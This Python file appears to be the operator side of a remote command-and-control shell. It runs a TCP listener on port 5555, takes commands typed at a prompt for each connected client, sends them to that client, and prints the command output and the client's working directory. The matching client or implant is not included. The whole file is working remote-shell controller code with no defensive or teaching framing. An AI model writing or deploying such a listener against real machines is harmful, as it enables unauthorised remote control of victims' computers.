import socket
import threading

HEADER = 16
FORMAT = "utf-8"

IP = socket.gethostbyname(socket.gethostname())
PORT = 5555
addr = (IP, PORT)

class Network:
    def __init__(self, conn):
        self.conn = conn

    #Server
    def recv_handler(self, msg):
        msg = str(msg)
        args = msg.split(" ")
        command = args.pop(0).upper()

        if command == "OUTPUT":
            output = " ".join(args).replace("\\n", "\n").replace("\\r", "\r").replace("b\"", "").replace("\"", "").replace("\\\\", "\\")
            return output
        elif command == "CWD":
            return " ".join(args)
        else:
            pass


    def recv(self):
        msg_length = self.conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = self.conn.recv(msg_length).decode(FORMAT)
            return self.recv_handler(msg)

    def send_handler(self, command, args):
        command = str(command)
        args = list(args)
        args = " ".join(args)
        return self.send(command + " " + args)

    def send(self, msg):
        msg = str(msg)
        message = msg.encode(FORMAT)
        msg_length = len(message)
        send_length = str(msg_length).encode(FORMAT)
        send_length += b" " * (HEADER - len(send_length))
        self.conn.send(send_length)
        self.conn.send(message)
        return self.recv()


    def close_conn(self):
        self.conn.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(addr)


def handle_client(conn, addr):
    print(f"[NEW CONNETION] {addr}, connected.")
    n = Network(conn)

    connected = True
    while connected:
        try:
            cwd = str(n.send("GET_CWD"))
            cwd = cwd.replace("b'", "")
            cwd = cwd.replace("'", "")  
            cwd = cwd.replace("\\\\", "\\")
            cwd = cwd.replace("\\n", "")
            cwd = cwd.replace("\\r", "")

            print("")
            command = input(str(cwd) + ">")
            output = n.send_handler("COMMAND", command)
            output = output.replace("b'", "")
            output = output.replace("\n'", "")
            print(output)
        except:
            print("Connection Lost")
            connected = False
            n.close_conn()


server.listen(1)
print(f"[LISTENING] Server is listening on address: {IP} and port: {PORT}")

while True:
    conn, addr = server.accept()
    thread = threading.Thread(target=handle_client, args=(conn, addr))
    thread.start()
